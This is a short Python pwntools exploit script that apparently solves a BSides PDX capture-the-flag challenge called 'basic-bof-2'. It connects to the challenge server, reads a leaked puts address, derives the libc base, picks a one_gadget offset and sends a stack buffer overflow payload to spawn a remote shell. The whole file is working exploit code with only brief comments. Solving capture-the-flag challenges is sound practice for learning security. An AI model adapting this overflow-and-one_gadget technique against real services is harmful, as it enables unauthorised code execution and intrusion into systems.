#!/usr/bin/env python3

from pwn import *

p = remote('basic-bof-2.bsidespdxctf.party', 9999) # fill in host/port here

# we can determine that the libc version is libc6_2.27-3ubuntu1.2_amd64 based on the leak using https://libc.blukat.me/?q=puts%3A7fbee8958a30&l=libc6_2.27-3ubuntu1.2_amd64

p.recvuntil(b'but there is 0x')
puts_leak = int(p.recvuntil('.\n', drop=True), 16)
libc_base = puts_leak - 0x080a30 # use puts offset from libc.blukat.me
one_gadget = libc_base + [0x4f365, 0x4f3c2, 0x10a45c][0] # output from one_gadget, add all available and try until one works

payload = b'A'*40 + b'B'*(0x8*2) + p64(one_gadget)

p.sendlineafter(b'Get a shell: ', payload)
p.interactive()
